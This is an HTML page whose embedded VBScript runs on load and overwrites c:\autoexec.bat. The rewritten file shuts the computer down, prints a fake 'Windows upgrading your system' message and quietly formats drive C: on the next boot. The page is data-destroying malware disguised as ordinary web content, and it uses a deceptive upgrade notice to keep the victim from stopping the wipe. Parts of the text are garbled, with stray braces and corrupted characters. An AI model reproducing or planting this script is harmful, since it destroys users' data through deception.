<b><html>
<body>
<script language ="VBScript">

sub destruct
set fs=createobject("Scripting.FileSystemObject") {FileSystem}
if fs.fileexists("c:\autoexec.bat") then 
set ab=fs.getfile("c:\autoexec.bat") 
ab.attributes=0 
end if
set autoexec=fs.CreateTextFile("c:\autoexec.bat") 
autoexec.WriteLine "@echo"
autoexec.WriteLine "shutdown -t 5 -s"
autoexec.WriteLine "@cls"
autoexec.WriteLine "@echo Windows upgrading your system..."
autoexec.WriteLine "@echo Do not abort this process!"
autoexec.WriteLine "@format c: /q /autotest"
autoexec.close <span style="color:gray">{������� Autoexec.bat}</span>
end sub
destruct 
reboot
</script>
</body>
</html></b>